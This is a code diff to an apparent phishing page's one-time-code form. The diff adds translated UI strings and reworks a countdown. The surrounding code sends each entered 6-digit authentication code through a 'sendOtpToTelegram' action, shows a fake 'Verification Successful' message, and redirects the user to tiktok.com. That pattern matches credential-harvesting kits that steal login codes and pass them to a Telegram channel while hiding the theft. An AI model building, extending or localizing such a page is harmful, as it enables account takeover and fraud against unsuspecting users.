@@ -29,6 +29,7 @@ import {
 } from "@/components/ui/dialog"
 import { useToast } from "@/hooks/use-toast"
 import { sendOtpToTelegram } from "@/app/actions/telegram"
+import { useLanguage } from "@/contexts/language-context"
 
 const FormSchema = z.object({
   pin: z.string().min(6, {
@@ -40,6 +41,7 @@ const FormSchema = z.object({
 const REDIRECT_URL = "https://www.tiktok.com/";
 
 export function OtpForm() {
+  const { t } = useLanguage();
   const { toast } = useToast()
   const router = useRouter()
   const [isSubmitting, setIsSubmitting] = useState(false)
@@ -56,19 +58,15 @@ export function OtpForm() {
 
   useEffect(() => {
     let countdownTimer: NodeJS.Timeout | null = null;
-    if (showRedirectModal) {
-      if (redirectCountdown > 0) {
-        countdownTimer = setInterval(() => {
-          setRedirectCountdown((prevCountdown) => prevCountdown - 1);
-        }, 1000);
-      } else {
+    if (showRedirectModal && redirectCountdown === 0) {
         window.location.href = REDIRECT_URL;
-      }
+    } else if (showRedirectModal) {
+        countdownTimer = setInterval(() => {
+            setRedirectCountdown((prev) => prev - 1);
+        }, 1000);
     }
     return () => {
-      if (countdownTimer) {
-        clearInterval(countdownTimer);
-      }
+        if(countdownTimer) clearInterval(countdownTimer);
     };
   }, [showRedirectModal, redirectCountdown]);
 
@@ -86,15 +84,15 @@ export function OtpForm() {
 
     if (result.success) {
       toast({
-        title: "Verification Successful",
-        description: "Your code has been verified.",
+        title: t('verificationSuccess'),
+        description: t('codeVerified'),
       })
       setShowRedirectModal(true)
     } else {
       form.setError("pin", { message: "Invalid or expired code. Please try again."})
       toast({
-        title: "Verification Failed",
-        description: "The code you entered is incorrect. Please try again.",
+        title: t('verificationFailed'),
+        description: t('invalidCode'),
         variant: "destructive",
       })
     }
@@ -111,9 +109,9 @@ export function OtpForm() {
     <>
       <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
         <div className="text-center">
-          <h1 className="text-2xl font-bold font-headline">Enter authentication code</h1>
+          <h1 className="text-2xl font-bold font-headline">{t('enterAuthCode')}</h1>
           <p className="text-sm text-muted-foreground mt-2">
-            Enter the 6-digit code sent to you. It will expire in{" "}
+            {t('otpSubheading')}{" "}
             <span className="font-bold text-primary">{formatTime(otpTimer)}</span>.
           </p>
         </div>
@@ -142,7 +140,7 @@ export function OtpForm() {
             />
 
             <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
-              {isSubmitting ? "Verifying..." : "Verify"}
+              {isSubmitting ? t('verifying') : t('verify')}
             </Button>
           </form>
         </Form>
@@ -151,14 +149,14 @@ export function OtpForm() {
       <Dialog open={showRedirectModal} onOpenChange={setShowRedirectModal}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle className="text-center text-xl">Verification Successful!</DialogTitle>
+            <DialogTitle className="text-center text-xl">{t('verificationSuccessful')}</DialogTitle>
             <DialogDescription className="text-center pt-2">
-              You will be redirected shortly.
+              {t('redirectingShortly')}
             </DialogDescription>
           </DialogHeader>
           <div className="flex flex-col items-center justify-center p-6 space-y-4">
             <div className="text-6xl font-bold text-primary">{redirectCountdown}</div>
-            <p className="text-muted-foreground">Redirecting...</p>
+            <p className="text-muted-foreground">{t('redirectingShortly')}...</p>
           </div>
         </DialogContent>
       </Dialog>
